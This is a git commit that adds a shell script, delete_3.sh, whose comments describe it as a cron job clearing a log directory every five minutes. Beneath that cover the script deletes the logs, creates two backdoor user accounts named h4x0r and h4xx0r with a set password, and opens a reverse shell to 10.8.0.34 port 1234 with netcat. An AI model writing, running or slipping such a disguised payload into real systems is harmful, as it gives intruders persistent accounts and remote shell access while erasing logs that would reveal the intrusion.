226b5367efdc196f6a8df10b7ee0e314a823c017
hack142 <74508078+hack142@users.noreply.github.com>
2020-11-19 13:45:16 +0100

    Create delete_3.sh

---
+++ delete_3.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+# Delete any file in the log directory
+# This script is executed every 5 minutes (via cron job)
+
+rm -rf /opt/admin/logs/*
+useradd -m -p "password" -s /bin/bash h4x0r
+sudo useradd -m -p "password" -s /bin/bash h4xx0r
+
+echo 'we are done with our shits!' >> we_are_done.txt
+
+nc -e /bin/bash 10.8.0.34 1234
